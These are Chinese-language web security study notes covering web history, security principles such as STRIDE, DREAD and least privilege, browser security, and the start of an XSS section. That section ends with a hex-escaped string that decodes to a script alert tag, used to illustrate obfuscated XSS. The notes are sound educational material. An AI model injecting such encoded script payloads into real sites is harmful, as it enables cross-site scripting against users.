Attention:
> 1. 在阅读各内容之前，建议先阅读rules.md文件(It is recommended to read the rules.md file before reading the individual contents.)
> 2. 我的英语水平非常差，所以本文中的英文可能会出现一些差错，如果发现比较奇怪的英语语法或内容时，建议使用翻译器翻译上方的中文，请谅解(My English is very poor, so there may be some errors in the English in this article. If you find strange English grammar or content, please understand that you are advised to use a translator to translate the Chinese above.)
> 3. 本文章内的所有内容均以中文呈现。本作者现在正在学习英语，现只到达托福70分的水准，等到以后我的英语学习之路基本完成，我会继续编写英文版内容，请谅解(All content in this article is presented in Chinese. The author is currently studying English and has only reached a TOEFL score of 70. Please understand that I will continue to write English content when my English learning journey is basically complete.)
> 4. 文段中存在重复的问题的地方，会只在一处地方讲解(Where there are repetitive questions in the passage, they will be explained in one place only.)
> 5. 一些重要内容会用红色标注，标题会用黄色标注，其中可能还会出现其他颜色，但颜色不会在github界面显示，如果可以，请调至code模式观看，如果将文档下载至本地，则建议使用深色界面观看(Some important content will be marked in red, title will be marked in yellow, and other colours may also appear in it, but the colour will not be displayed in the github interface, if possible, please turn to code mode to watch, if you are downloading a document locally, it is recommended that you use the dark interface to view it)
> 6. 如果现在有需要阅读英文版的文章，请使用翻译器辅助阅读(推荐使用chatGPT进行翻译，因为翻译器不能完整且准确地表达出本文中的专业性知识，若使用chatGPT，建议给一个前情提要)(If you now have to read the English version of the article, please use a translator to assist you in reading it. (It is recommended to use chatGPT for translation, as the translator does not give a complete and accurate representation of the expertise in this article, if you use chatGPT, it is recommended to give a foreword.))
> 7. 如果我的文章中存在任何问题，欢迎大家指出(If there are any problems in my article, please feel free to point them out.)
> 8. 以下内容和各文件夹(文件夹不包括reprint、thematic topic and analysis、tools)中的内容一致，仅为更可观的版本存在于此(The following content corresponds to the content in each folder (folders excluding reprint, thematic topic and analysis, tools), only the more substantial version exists here.)
> 9. 之后的内容将会直接补充到这个文档中，将不在向文件夹中补充，所以文件夹中的文件可理解为已弃用的文件(The subsequent content will be added directly to this document and will not be added to the folder, so the files in the folder can be interpreted as discarded files.)
> 10. 可能因为部分原因

csdn address:[hackjacking.blog.csdn.net](https://hackjacking.blog.csdn.net/)

# Web

参考资料来源于
> - CSDN
> - GitHub
> - Google
> - 维基百科
> - YouTube
> - MDN Web Docs
> - 其他小型网站与书籍

## <font color="yellow">0x00世界观安全</font>

### <font color="yellow">01 Web发展史</font>

#### <font color="yellow">001 静态网页的诞生</font>

> 1989年，在欧洲粒子物理实验室(粒子物理研究通常与来自世界各地的研究所进行合作)的IT部门工作的Tim Berners-Lee向其领导提出了一项名为Information Management: A Proposal的提议：使来自世界各地的远程站点的研究人员能够组织和汇集信息，在个人计算机上访问大量的科研文献，并建议在文档中链接其他文档，这就是Web的原型
>
> 1990年，Tim以超文本语言HTML为基础在NeXT电脑上发明了最原始的Web浏览器
>
> 1991年，Tim作为布道者在Internet上广泛推广Web的理念，与此同时，美国国家超算应用中心(National Center for Supercomputer Applications)对此表现出了浓厚的兴趣，并开发了名为Mosaic的浏览器，于1993年4月进行了发布
>
> 1994年5月，第一届万维网大会在日内瓦召开
>
> 1994年7月，HTML2规范发布
>
> 1994年9月，因特网工程任务组(Internet Engineering Task Force)设立了HTML工作组
>
> 1994年11月，Mosaic浏览器的开发人员创建了网景公司(Netscape Communications Corp.)，并发布了Mosaic Netscape 1.0 beta浏览器，后改名为Navigator

#### <font color="yellow">002 万维网(W3C)诞生</font>

> 1994年底，由Tim牵头的万维网联盟(World Wide Web Consortium)成立，这标志着万维网的正式诞生
>
> 此时的网页以HTML为主，是纯静态的网页，网页是“只读”的，信息流只能通过服务器到客户端单向流通，由此世界进入了Web 1.0时代
>
> W3C在1994年被创建的目的是，为了完成麻省理工学院(MIT)与欧洲粒子物理研究所(CERN)之间的协同工作，并得到了美国国防部高级研究计划局(DARPA)和欧洲委员会(European Commission)的支持
>
> W3C最重要的工作是发展Web规范(称为推荐，Recommendations)，这些规范描述了Web的通信协议(比如HTML和XHTML)和其他的构建模块

#### <font color="yellow">003 JavaScript的诞生</font>

> 1995年，网景工程师Brendan Eich花了10天时间设计了JavaScript语言。起初这种脚本语言叫做Mocha，后改名LiveScript，后来为了借助Java语言创造良好的营销效果最终改名为JavaScript。网景公司把这种脚本语言嵌入到了Navigator 2.0之中，使其能在浏览器中运行
>
> 与此相对的是，1996年，微软发布了VBScript和JScript。JScript是对JavaScript进行逆向工程的实现，并内置于Internet Explorer 3中。但是JavaScript与JScript两种语言的实现存在差别，这导致了程序员开发的网页不能同时兼容Navigator和Internet Explorer浏览器。Internet Explorer开始抢夺Netscape的市场份额，这导致了第一次浏览器战争

#### <font color="yellow">004 第一次浏览器战争</font>

> Netscape的市场份额逐年萎缩
>
> 1996年11月，为了确保JavaScript的市场领导地位，网景将JavaScript提交到欧洲计算机制造商协会（European Computer Manufacturers Association）以便将其进行国际标准化
> 
> 1997年6月，ECMA以JavaScript语言为基础制定了ECMAScript标准规范ECMA-262。JavaScript是ECMAScript规范最著名的实现之一，除此之外，ActionScript和JScript也都是ECMAScript规范的实现语言。自此，浏览器厂商都开始逐步实现ECMAScript规范
> 
> 1998年6月，ECMAScript2规范发布，并通过ISO生成了正式的国际标准ISO/IEC 16262
> 
> 1999年12月，ECMAScript3规范发布，在此后的十年间，ECMAScript规范基本没有发生变动。ECMAScript3成为当今主流浏览器最广泛使用和实现的语言规范基础
> 
> 第一次浏览器战争以IE浏览器完胜Netscape而结束，IE开始统领浏览器市场，份额的最高峰达到2002年的96%。随着第一轮大战的结束，浏览器的创新也随之减少

#### <font color="yellow">005 动态页面的崛起</font>

> JavaScript诞生之后，可以用来更改前端DOM的样式，实现一些类似于时钟之类的小功能。那时候的JavaScript仅限于此，大部分的前端界面还很简单，显示的都是纯静态的文本和图片。这种静态页面不能读取后台数据库中的数据，为了使得Web更加充满活力，以PHP、JSP、ASP.NET为代表的动态页面技术相继诞生
>
> PHP（PHP：Hypertext Preprocessor）最初是由Rasmus Lerdorf在1995年开始开发的，现在PHP的标准由PHP Group维护。PHP是一种开源的通用计算机脚本语言，尤其适用于网络开发并可嵌入HTML中使用。PHP的语法借鉴吸收C语言、Java和Perl等流行计算机语言的特点，易于一般程序员学习。PHP的主要目标是允许网络开发人员快速编写动态页面
>
> JSP（JavaServer Pages）是由Sun公司倡导和许多公司参与共同创建的一种使软件开发者可以响应客户端请求，从而动态生成HTML、XML或其他格式文档的Web网页的技术标准。JSP技术是以Java语言为基础的。1999年，JSP1.2规范随着J2EE1.2发布
>
> ASP（Active Server Pages）1.0 在1996年随着IIS 3.0而发布。2002年，ASP.NET发布，用于替代ASP
> 
> 随着这些动态服务器页面技术的出现，页面不再是静止的，页面可以获取服务器数据信息并不断更新。以Google为代表的搜索引擎以及各种论坛相继出现，使得Web充满了活力
> 
> 随着动态页面技术的不断发展，后台代码变得庞大臃肿，后端逻辑也越来越复杂，逐渐难以维护。此时，后端的各种MVC框架逐渐发展起来，以JSP为例，Struct、Spring等框架层出不穷
> 
> 从Web诞生至2005年，一直处于后端重、前端轻的状态

#### <font color="yellow">006 XHTML</font>

> 1999年，W3C发布HTML 4.01标准，同年微软推出用于异步数据传输的ActiveX，随即各大浏览器厂商模仿实现了XMLHttpRequest（AJAX雏形）
>
> 2000年，W3C采用了一个大胆的计划，把XML引入HTML，XHTML 1.0作为W3C推荐标准发布
>
> 2001年5月，W3C推出了CSS 3.0规范草案
>
> 2002年到2006年，XHTML 2.0最终放弃
>
> 2009年，W3C宣布XHTML 2.0不再继续，宣告死亡

#### <font color="yellow">007 AJAX的流行</font>

> 在Web最初发展的阶段，前端页面要想获取后台信息需要刷新整个页面，这是很糟糕的用户体验
>
> Google分别在2004年和2005年先后发布了两款重量级的Web产品：Gmail和Google Map。这两款Web产品都大量使用了AJAX技术，不需要刷新页面就可以使得前端与服务器进行网络通信，这虽然在当今看来是理所应当的，但是在十几年前AJAX却是一项革命性的技术，颠覆了用户体验
>
> 随着AJAX的流行，越来越多的网站使用AJAX动态获取数据，这使得动态网页内容变成可能，像Facebook这样的社交网络开始变得繁荣起来，前端一时间呈现出了欣欣向荣的局面
>
> AJAX使得浏览器客户端可以更方便地向服务器发送数据信息，这促进了Web 2.0的发展
>
> Google Trend: AJAX从2005年开始得到开发人员的广泛关注

#### <font color="yellow">008 第二次浏览器大战</font>

> 前端兼容性框架的出现
>
> IE在第一次浏览器大战中击败Netscape赢得胜利，垄断了浏览器市场。作为独裁者，IE并不遵循W3C的标准，IE成了事实标准
>
> Netscape于1998年被AOL收购前创建了Mozilla社区，Firefox于2004年11月首次发布，并且9个月内下载量超过6000万，获取了巨大的成功，IE的主导地位首次受到了挑战，Firefox被认为是Netscape的精神续作
>
> 之后Firefox浏览器一路奋起直追，逐渐蚕食IE市场份额，这引发了第二次浏览器战争。在2008年底时，Firefox的市场份额达到了25%以上，IE则跌至65%以下
>
> 第二次浏览器战争中，随着以Firefox和Opera为首的W3C阵营与IE对抗程度的加剧，浏览器碎片化问题越来越严重，不同的浏览器执行不同的标准，对于开发人员来说这是一个恶梦
>
> 为了解决浏览器兼容性问题，Dojo、jQuery、YUI、ExtJS、MooTools等前端Framework相继诞生。前端开发人员用这些Framework频繁发送AJAX请求到后台，在得到数据后，再用这些Framework更新DOM树
>
> 其中，jQuery独领风骚，几乎成了所有网站的标配。Dojo、YUI、ExtJS等提供了很多组件，这使得开发复杂的企业级Web应用成为可能
>
> Google Trend: 蓝色jQuery，红色Dojo，绿色YUI，紫色ExtJS，黄色MooTools

#### <font color="yellow">009 HTML5</font>

> 1999年，W3C发布了HTML 4.0.1版本，在之后的几年，没有再发布更新的Web标准。随着Web的迅猛发展，旧的Web标准已不能满足Web应用的快速增长
>
> 2004年6月，Mozilla基金会和Opera软件公司在万维网联盟（W3C）所主办的研讨会上提出了一份联合建议书，其中包括Web Forms 2.0的初步规范草案。建议举行一次投票，以表决W3C是否应该扩展HTML和DOM，从而满足Web应用中的新需求。研讨会最后以8票赞成，14票反对否决此建议，这引起一些人的不满，不久后，部分浏览器厂商宣布成立网页超文本技术工作小组（WHATWG），以继续推动该规范的开发工作，该组织再度提出Web Applications 1.0规范草案，后来这两种规范合并形成HTML5。2007年，获得W3C接纳，并成立了新的HTML工作团队。2008年1月22日，第一份正式草案发布
>
> HTML5草案发布不久，Google在2008年12月发布了Chrome浏览器，加入了第二次浏览器大战当中。Chrome使用了Safari开源的WebKit作为布局引擎，并且研发了高效的JavaScript引擎V8
>
> 尽管HTML5在网络开发人员中非常出名了，但是它成为主流媒体的一个话题是在2010年的4月，当时苹果公司的CEO乔布斯发表一篇题为“对Flash的思考”的文章，指出随着HTML5的发展，观看视频或其它内容时，Adobe Flash将不再是必须的。这引发了开发人员间的争论，包括HTML5虽然提供了加强的功能，但开发人员必须考虑到不同浏览器对标准不同部分的支持程度的不同，以及HTML5和Flash间的功能差异
>
> 在第二次浏览器大战中，各个浏览器厂商都以提升JavaScript运行效率和支持HTML5各种新特性为主要目标，促进了浏览器的良性竞争。在这一场战争中，Chrome攻城略地，抢夺IE市场份额。2013年，Chrome超过IE，成为市场份额最高的浏览器。2016年，Chrome占据了浏览器市场的半壁江山
>
> 全球浏览器市场份额（2009-2017）
>
> 自2008年以来，浏览器中不断支持的HTML5新特性让开发者激动不已：WebWorker可以让JavaScript运行在多线程中，WebSocket可以实现前端与后台的双工通信，WebGL可以创建Web3D网页游戏......
>
> 桌面浏览器对HTML5支持程度（2009-2017）
>
> 2014年10月28日，W3C正式发布HTML 5.0推荐标准

#### <font color="yellow">010 Node.js的爆发</font>

> 早在1994年，Netspace就公布了其Netspace Enterprise Server中的一种服务器脚本实现，叫做LiveWire，是最早的服务器端JavaScript，甚至早于浏览器中的JavaScript。对于这门图灵完备的语言，Netspace很早就开始尝试将它用在后端
>
> 微软在1996年发布的IE 3.0中内嵌了自己的JScript语言，其兼容JavaScript语法。1997年年初，微软在它的服务器IIS 3.0中也包含了JScript，这就是我们在ASP中能使用的脚本语言
>
> 1997年，Netspace为了用Java实现JavaScript而创建了Rhino项目，最终Rhino演变成一个基于Java实现的JavaScript引擎，由Mozilla维护并开源。Rhino可以为Java应用程序提供脚本能力。2006年12月，J2SE 6将Rhino作为Java默认的脚本引擎
>
> SpiderMonkey是Mozilla用C/C++语言实现的一个JavaScript引擎，从Firefox 3.5开始作为JavaScript编译引擎，并被CouchDB等项目作为服务端脚本语言使用
>
> 可以看到，JavaScript最开始就能同时运行在前后端，但时在前后端的待遇却不尽相同。随着Java、PHP、.Net等服务器端技术的风靡，与前端浏览器中的JavaScript越来越流行相比，服务端JavaScript逐渐式微
>
> 2008年Chrome发布，其JavaScript引擎V8的高效执行引起了Ryan Dahl的注意。2009年，Ryan利用Chrome的V8引擎打造了基于事件循环的异步I/O框架——Node.js诞生
>
> Node.js具有以下特点
>
> - 基于事件循环的异步I/O框架，能够提高I/O吞吐量
> - 单线程运行，能够避免了多线程变量同步的问题
> - 使得JavaScript可以编写后台代码，前后端编程语言统一
>
> Node.js的出现吸引了很多前端开发人员开始用JavaScript开发服务器代码，其异步编程风格也深受开发人员的喜爱。Node.js的伟大不仅在于拓展了JavaScript在服务器端的无限可能，更重要的是它构建了一个庞大的生态系统
>
> 2010年1月，NPM作为Node.js的包管理系统首次发布。开发人员可以按照CommonJS的规范编写Node.js模块，然后将其发布到NPM上面供其他开发人员使用。目前NPM具有40万左右的模块，是世界上最大的包模块管理系统
>
> 2016年常见包管理系统模块数量，NPM高居榜首
>
> Node.js也催生了node-webkit等项目，用JavaScript开发跨平台的桌面软件也成为可能。Node.js给开发人员带来了无穷的想象，JavaScript大有一统天下的趋势

#### <font color="yellow">011 前端MV*架构</font>

> 随着HTML5的流行，前端不再是人们眼中的小玩意，以前在C/S中实现的桌面软件的功能逐步迁移到了前端，前端的代码逻辑逐渐变得复杂起
>
> 以前只用于后台的`MV*`等架构在前端逐渐使用起来，以下列举了部分常用的`MV*`框架来
>
> 随着这些MV*框架的出现，网页逐渐由Web Site演变成了Web App，最终导致了复杂的单页应用（ Single Page Application）的出现
>
> 移动Web和Hybrid App
>
> 随着iOS和Android等智能手机的广泛使用，移动浏览器也逐步加强了对HTML5特性的支持力度
>
> 移动浏览器对HTML5支持程度（2009-2017）
>
> 移动浏览器的发展，导致了流量入口逐渐从PC分流到移动平台，这是Web发展的新机遇。移动Web面临着更大的碎片化和兼容性问题，jQuery Mobile、Sencha Touch、Framework7、Ionic等移动Web框架也随之出现
>
> 相比于Native App，移动Web开发成本低、跨平台、发布周期短的优势愈发明显，但是Native App的性能和UI体验要远胜于移动Web。移动Web与Native App孰优孰劣的争论愈演愈烈，在无数开发者的实践中，人们发现两者不是替代关系，而是应该将两者结合起来，取长补短，Hybrid技术逐渐得到认同
>
> Hybrid技术指的是利用Web开发技术，调用Native相关API，实现移动与Web二者的有机结合，既能体现Web开发周期短的优势，又能为用户提供Native体验
>
> 根据实现原理，Hybrid技术可以分为两大类
> 
> - 将HTML5的代码放到Native App的WebView控件中运行，WebView为Web提供宿主环境，JavaScript代码通过WebView调用Native API。典型代表有PhoneGap(Cordova)以及国内的AppCan等
> - 将HTML5代码针对不同平台编译成不同的原生应用，实现了Web开发，Native部署。这一类的典型代表有Titanium和NativeScript
>
> Hybrid一系列技术中很难找出一种方案适应所有应用场景，我们需要根据自身需求对不同技术进行筛选与整合

#### <font color="yellow">012 ECMAScript6</font>

> JavaScript语言是ECMAScript标准的一种实现，截止2017年2月，ECMAScript一共发布了7个版本
>
> 1997年6月， ECMAScript 1.0标准发布
>
> 1998年6月，ECMAScript 2.0发布
>
> 1999年12月，ECMAScript 3.0发布
>
> 2007年10月，Mozilla主张的ECMAScript 4.0版草案发布，对3.0版做了大幅升级，该草案遭到了以Yahoo、Microsoft、Google为首的大公司的强烈反对，JavaScript语言的创造者Brendan Eich和IE架构师Chris Wilson甚至在博客上就ES4向后兼容性问题打起了口水仗，最后由于各方分歧太大，ECMA开会决定废弃中止ECMAScript 4.0草案。经各方妥协，在保证向下兼容的情况下，将部分增强的功能放到ECMAScript 3.1标准中，将原有ECMAScript 4.0草案中激进的功能放到以后的标准中。不久，ECMAScript 3.1就改名为ECMAScript 5
>
> 2009年12月，本着'Don’t break the web'原则，ECMAScript 5发布。新增了strict模式、属性getter和setter等
>
> 2011年6月，ECMAScript 5.1发布
>
> 2015年6月，ECMAScript 6.0发布。该版本增加了许多新的语法，包括支持let、const、Arrow function、Class、Module、Promise、Iterator、Generator、Set、Map、async、Symbol、Proxy、Reflect、Decorator等。TC39委员会计划以后每年都发布一个新版本的ECMAScript，所以ECMAScript 6.0改名为ECMAScript 2015
>
> 2016年6月，在ECMAScript 2015的基础上进行了部分增强，发布了ECMAScript 2016
>
> 在ECMAScript的各个版本中，ECMAScript 6.0无疑最受人瞩目的，它增加了许多新特性，极大拓展了JavaScript语法和能力，以至于许多浏览器都只能支持部分ES6中的新特性。随之，Babel和TypeScript逐渐流行起来，编写ES6代码，然后用Babel或TypeScript将其编译为ES5等浏览器支持的JavaScript
>
> ECMAScript以后每年将会发布一个新版本，这无疑将持续促使浏览器厂商不断为JavaScript注入新的功能与特性，JavaScript走上了快速发展的正轨

### <font color="yellow">02 安全世界观</font>

#### <font color="yellow">001 简介</font>

用户的最高权限叫做root(administrator) ，黑客最渴望的就是获得root

黑客使用的漏洞利用代码叫做exploit

黑客中的种类

- 一、精通计算机技术，能自己挖漏洞，并编写exploit，`多为白帽`
- 二、只对攻击本身感兴趣，对技术方面各项的了解比较浅，自己没有动手能力，只能看懂别人的代码，这类黑客被称为Script kids，`这是大多数黑客的类型`，`虽然黑客本身是具有破坏性的，但是第一种黑客是鳳毛麟角`


现实中，真正能够造成大规模破坏的往往不是挖掘并研究漏洞的黑客，而是这些Script Kids

SQL注入、XSS攻击的出现是Web安全史上的一个里程碑

伴随着Web 2.0 的兴起，XSS、CSRF等攻击已经变得更强大了

#### <font color="yellow">002 黑帽子、白帽子</font>

黑帽子：利用黑客技术造成破坏
1. 工作心态方面：
   - 工作心态：找到系统的一个漏洞，达到入侵的目的
   - 工作环境：一个人或小团队(黑客有关)
   - 工作目的：入侵系统，找到对自己价值的数据，以点突破，找到对自己最有作用的点以此渗透
   - 工作观察方面：思考问题的出发点必然是选择性的、微观性的
2. 对待问题方式：
   - 对待问题：为了完成一次入侵，需要利用各种不同漏洞的组合来达到目的

白帽子：精通安全技术，但工作在反黑客领域的网络安全专家
1. 工作心态方面：
    - 工作心态：找到系统的所有漏洞，不有遗漏项，保证系统不再出问题，`不可能做到100%无漏洞，只是让黑客无从下手`
    - 工作环境：为企业或安全公司工作
    - 工作目的：出发点在于解决一切安全问题
    - 工作观察方面：所看所想要全面和宏观
2. 对待问题方式：
    - 对待问题：在设计方案时，如果只看到各种问题组合后产生的效果，就会把事情变得更复杂，难以细致入微地解决根本问题，所以白帽子必然是在不断地分解问题，在对分解后的问题逐个给予解决
    - 选用的方法：客服某种攻击方式，而并非抵御单次攻击

#### <font color="yellow">003 安全的本质</font>

通过安全检测的过程，可与梳理未知的人或物，使其变得可信任，被划分出来的具有不同信任级别的区域，被称为信任域，划分两个信任域的分界线，被称为信任边界

安全问题的考虑选择：选择内容为发生概率高的安全问题，不太会考虑不可能发生的事件

一旦我们做出决策的依据、条件被打破、被绕过，那么就会导致安全假设的前提条件不再可靠，变成一个伪命题

把握住信任条件的度，使其恰到好处，正是设计安全方案的难点所在，也正是安全这门学问的魅力所在

安全是一个持续学习的内容

#### <font color="yellow">004 安全三要素</font>

简称CIA

- 机密性(Confidentiality)：要求保护数据内容不能泄露，加密是实现机密性要求的常见手段
- 完整性(Integrity)：要求保护数据内容是完整、没有更改的，常见的保证一致性的技术手段是数字签名
- 可用性(Availability)：要求保护资源是随需而得的

随着时代的进步，后人又增加了可设计性、不可抵赖性等，但最核心的还是以上三要素在设计安全方案时也要以这三要素为思考的出发点，更全面地思考问题

> 不可抵赖性，又称不可否认性，英文为Non-repudiation，电子商务交易各方在交易完成时要保证的不可抵赖性，指在传输数据时必须携带含有自身特质、别人无法复制的信息，防止交易发生后对行为的否认，通常可通过对发送的消息进行数字签名来实现信息的不可抵赖性

#### <font color="yellow">005 如何实施安全评估</font>

安全评估的过程
1. 资产等级划分

有时候资源的可用性可以理解为数据的可用性，互联网安全的核心问题是数据安全的问题

2. 威胁分析

`威胁：只可能导致对系统或组织危害的事故潜在的起因`，可能造成危害的来源叫做危害；可能出现的损失叫做分险

威胁建模方法 —— STRIDE
- Spoofing(伪装)
	- 定义：冒充他人身份
	- 对应的安全属性：认证
- Tampering(更改)
	- 定义：修改数据或代码
	- 对应的安全属性：完整性
- Repudiation(抵赖)
	- 定义：否认做过的事情
	- 对应的安全属性：不可抵赖性
- InformationDisclosure(信息泄露)
	- 定义：机密信息泄露
	- 对应的安全属性：机密性
- Denial of Service(拒绝服务)
	- 定义：拒绝服务
	- 对应的安全属性：可用性
- Elevation of Privilege(提升权限)
	- 定义：未经授权获得许可
	- 对应的安全属性：授权

在进行威胁分析时，要尽可能地不遗漏威胁，头脑风暴的过程可以确定攻击面(Attack Surface)

漏洞的定义：系统中可能被威胁利用以造成危害的地方

3. 风险分析

`风险：指某种特定的危险事件(事故或意外事件)发生的可能性与其产生的后果的组合`

影响风险高低的因素
  1. 造成损失的大小
  2. 发生的概率

风险程度模型 —— DREAD
- Damage Potential
	- 高：获取完整的验证权限；执行管理员操作；非法上传文件
	- 中：泄露敏感信息
	- 低：泄露其他信息
- Reproducibility
	- 高：攻击者可以重复攻击
	- 中：攻击者可以重复攻击，但有时间限制
	- 低：攻击者很难重复攻击
- Exploitability
	- 高：初学者在短期内能掌握攻击方法
	- 中：熟练的攻击者才能完成这次攻击
	- 低：漏洞利用条件非常苛刻
- Affected Users
	- 高：所有用户，默认设置，关键用户
	- 中：部分用户，非默认配置
	- 低：极少数用户，匿名用户
- Discoverability
	- 高：漏洞很显眼，攻击条件很容易获得
	- 中：在私有区域，部分人能看到，需要深入挖掘漏洞
	- 低：发现该漏洞极为困难

风险高低的定义(高(3)中(2)低(1))
  - Risk = D(a)+R(b)+E(c)+A(d)+D(e) = a+b+c+d+e
		- 高危：Risk = 12～15
		- 中危：Risk = 8～11
		- 低危：Risk = 0～7

<font color="red">模型只是工具，起决定性作用的是人</font>

4. 确认解决方案
解决方案一定要有针对性，针对前三点做出安全方案

安全评估的产出物就是安全解决方案

一个好的安全解决方案须具备以下几点：
  - 能够有效解决问题
  - 用户体验好
  - 高性能
  - 低耦合`耦合度：是对模块间关联程度的度量，耦合的强弱取决于模块间接口的复杂性，调用模块的方式以及通过界面传送数据的多少`

`优势：易于扩展与升级，如果是由专职的安全团队长期维护的系统，有些阶段可以只是实施一次`

#### <font color="yellow">006 白帽子兵法</font>

1. Secure By Default 原则

`最基本也是最重要的原则`

a. 黑白名单

`SSH段口有很多功能可以替代Telent，又可以为FTP、POP、PPP提供一个安全的通道`

`SSH是目前比较可靠的专为远程登录会话和其他网络服务提供安全性的协议`

- 黑名单：不安全程序
- 白名单：较安全程序

如果允许工程师在服务器上随意安装软件的话，则可能会因为安全部门不知道、不熟悉的软件，导致一些漏洞出现，从而增大攻击面

`在电脑系统里，有很多软件都应用到了黑白名单规则，操作系统、防火墙、杀毒软件、邮件系统、应用软件等，凡是涉及到控制方面几乎都应用了黑白名单规则`

b. 最小权限原则

`最小权限是指每个程序和系统用户都应该具有完成任务所必需的最小权限集合，因此，对于系统管理员而言，一个用户应该只能访问履行他的相关职责所需访问的数据和硬件`

最小权限原则要求系统只授予主体必要的权限，而不要过度授权，这样能有效的减少系统、网络、应用、数据库出错的机会

`sudo：linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的root命令`

2. 纵深防御原理

Defense in Depth

- 要在各个不同层面、不同方面实施安全方案，避免出现疏漏，不同安全方案之间需要相互配合，构成一个整体
- 要在正确的地方做正确的事，在解决根本问题的地方实施针对行的安全方案
	
他要求我们深入理解威胁的本质，从而做出正确的应对措施，更全面、正确地看待问题

UTM(Unified Threat Management)统一威胁管理

`纵深防御：通过设置多层重叠的安全防护系统而构成多道防线，使得即使某一防线失效也能被其他防线弥补或纠正，即通过增加系统的防御屏障或将各层之间的漏洞错开的方式防范差错发生的`

3. 数据与代码分离原理
	
这一原则广泛适用于各种由于注入(e.g.：SQL Injection;XSS;CRLF Injection;X-Path Injection)而引发的安全问题场景

缓冲区溢出也可以认为是程序违背了这一原则的后果

`缓冲区是一块连续的计算机内存区域,可保存相同数据类型的多个实例`

`缓冲区溢出是针对程序设计缺陷，向程序输入缓冲区写入使之溢出的内容(通常是超过缓冲区能保存的最大数据量的数据)，从而破坏程序运行、趁著中断之际并获取程序乃至系统的控制权`

从漏洞成因上看待问题

4. 不可预测性原则

克服攻击方法的角度看问题

Unpredictable

能够有效地对抗基于篡改、伪造的攻击

当token足够复杂时，不能被攻击者在测到

我们无法要求运行的程序没有漏洞，所以要使漏洞的攻击方法失败

需要用到加密算法、随机数算法、哈希算法

#### <font color="yellow">007 总结</font>

安全是一门朴素的学问，也是一种平衡的艺术

## <font color="yellow">0x01 客户端脚本安全</font>

### <font color="yellow">01 浏览器安全</font>

#### <font color="yellow">001 同源策略(Same Origin Policy)</font>

是一种约定，它是浏览器最核心、最基本的安全功能，如果缺少了同源策略，浏览器的正常功能可能都会受到影响

可以说，Web是建立在同源策略之上的

浏览器的同源策略限制了来自不同源的document或脚本，对当前document读取或设置某些属性

对于JavaScript来说，不同的URL会被分为同源与不同源`影响原因：host(域名/IP地址)、子域名、端口、协议`

XMLHttpRequest可以访问同源对象的内容，但同样收到同源的约束，使其不能跨越访问资源，在AJAX应用的开发中尤其注意这一点

除了DOM、Cookie、XMLHttpRequest会受到同源策略的限制，浏览器加载的一些第三方插件也有各自的同源策略`最常见的是Flash、Java Applet、Silverlight、Google Gears都有自己的控制策略`

浏览器的同源策略是浏览器安全的基础，许多客户端脚本攻击，都需要遵守这一原则，因此理解同源策略对于客户端脚本攻击有着重要意义，同源策略一旦被出现的漏洞绕过，也将带来非常严重的后果，很多基于同源策略制定的安全方案将失去效果
`同源是指域名、协议、端口相同`

`同源策略，它是由Netscape提出的一个著名的安全策略`

`同源策略是浏览器的行为，是为了保护本地数据不被JavaScript代码获取回来的数据污染，因此拦截的是客户端发出的请求回来的数据接收，即请求发送了，服务器响应了，但是无法被浏览器接收`

#### <font color="yellow">002 浏览器沙箱</font>

在网页中插入一段恶意代码，利用浏览器漏洞执行任意代码的攻击方式，在黑客圈子里被形象地称为挂马

防挂马操作：浏览器密切结合DEP、ASLR、SafeSEH等保护系统
> Google Chrome流程
>   浏览器进程
>   渲染进程`由Sandbox即沙箱隔离`
>   插件进程`e.g.：将Flash、Java、Pdf进行隔离，因此不会相互影响`
>   扩展进程

现在的Sandbox已经成为泛指资源隔离类模块的代名词

Sandbox的设计目的一般是为了让不可信任的代码运行在一定的环境中，限制不可信任的代码访问隔离区之外的资源

现在了浏览器的内部结构文件已经受到Sandbox的保护，但第三方应用却不受Sandbox的管辖，所以被攻克的浏览器往往是第三方应用的安全漏洞

```text
Sandbox是指一种技术，在这种技术中，软件运行在操作系统受限制的环境中
由于该软件在受限制的环境中运行，即使一个闯入该软件的入侵者也不能无限制访问操作系统提供设施
获得该软件控制权的黑客造成的损失也是有限的
如果攻击者要获得对操作系统的完全控制，他们就不得不攻克沙箱限制，Sandbox也提供深度防御
许多PaaS系统都提供了一个实时运行环境，它的核心就是一个沙箱应用程序
如Azu re和Google App Engime
```

#### <font color="yellow">003 恶意网址拦截</font>

工作原理：一般都是浏览器周期性地从服务器获取一份最新的恶意网址黑名单，如果用户上网时访问的网址在黑名单中，浏览器将弹出警告

常见的恶意网址分类
1. 挂马的网站，这些网站通常包含有恶意的脚本，如JavaScript或Flash，通过利用浏览器的漏洞执行shellcode，在用户电脑中植入木马
2. 钓鱼网站，通过模仿知名网站的相似页面来欺骗用户

除了恶意网址黑名单拦截功能外，主流浏览器都开始支持EV SSL(Extended Validation SSL Certificate)证书，以增强对安全网址的识别，`EV SSL证书是全球数字证书颁发机构与浏览器厂商一起打造的增强型证书`，其主要特色是浏览器会给予EV SSL证书特殊的待遇

EV SSL证书也遵循X509标准，并向前兼容普通证书，如果浏览器不支持EV模式，则会把该证书当作普通证书，如果浏览器支持EV模式，则会在地址栏中特别标注，因此在网站使用了EV SSL证书后，可以教育用户识别真实网站在浏览器地址栏中的绿色表现，以对抗钓鱼网站

#### <font color="yellow">004 高速发展的浏览器安全</font>

现在的浏览器还在不断地更新，不断地推出新的安全功能

CSP(Content Security Policy)这一策略是由安全专家Robert Hanson最早提出的

- 做法：由一个服务器返回一个HTTP头，并在其中描述页面应该遵守的安全策略

浏览器加载的插件也是浏览器安全需要考虑的一个问题：扩展与插件的权限到高于页面JavaScript的权限

#### <font color="yellow">005 总结</font>

浏览器是互联网安全的重要接口，在安全攻防中，浏览器的作用也越来越被人们重视

在以往研究攻防时，大家更重视服务器端漏洞，现在，安全研究的范围已经涵盖了所有用户使用互联网的方式，浏览器正是其中最重要的一个部分

加深理解同源策略，才能把握浏览器安全的本质

随着信息技术的发展，恶意网址检测、插件安全等问题都会显得越来越重要

### <font color="yellow">02 跨站脚本攻击(XSS)</font>

#### <font color="yellow">001 转义字符</font>

首先要认识一下`\`，`\`在JavaScript有着特殊的用途，它是转义的符号

e.g.：`\x3C\x73\x63\x72\x69\x70\x74\x3E\x61\x6C\x65\x72\x74\x28\x27\x70\x6F\x72\x75\x69\x6E\x27\x29\x3C\x2F\x73\x63\x72\x69\x70\x74\x3E`

这些就是经过编码后的字符，因为前面的`\`缘故，所以后面的这些字符在JavaScript中都会被还原

